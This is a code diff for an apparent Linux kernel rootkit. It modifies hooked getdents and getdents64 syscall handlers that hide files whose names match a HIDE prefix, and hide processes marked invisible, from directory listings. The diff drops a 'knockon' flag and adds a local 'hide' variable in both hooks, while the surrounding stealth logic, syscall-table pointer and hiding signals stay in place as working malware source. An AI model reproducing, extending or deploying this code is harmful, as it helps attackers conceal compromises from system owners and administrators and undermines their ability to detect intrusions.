@@ -50,7 +50,7 @@
 #define SIGHIDECONTENT  51
 #define SSIZE_MAX 	32767
 
-int hidden = 0, knockon = 0, hide_file_content = 1;
+int hidden = 0, hide_file_content = 1;
 static struct list_head *mod_list;
 static unsigned long *sct;
 atomic_t read_on;
@@ -455,6 +455,7 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdir, *prev = NULL;
 	struct inode *d_inode;
+	char *hide = HIDE;
 
 	if (ret <= 0) return ret;
 
@@ -473,7 +474,7 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 
 	while(off < ret) {
 		dir = (void *)kdir + off;
-		if((!p && (memcmp(HIDE, dir->d_name, strlen(HIDE)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if(dir == kdir) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
@@ -498,7 +499,8 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdir, *prev = NULL;
 	struct inode *d_inode;
-	
+	char *hide = HIDE;	
+
 	if (ret <= 0) return ret;	
 
 	kdir = kzalloc(ret, GFP_KERNEL);
@@ -516,7 +518,7 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 
 	while(off < ret) {
 		dir = (void *)kdir + off;
-		if((!p && (memcmp(HIDE, dir->d_name, strlen(HIDE)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if(dir == kdir) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
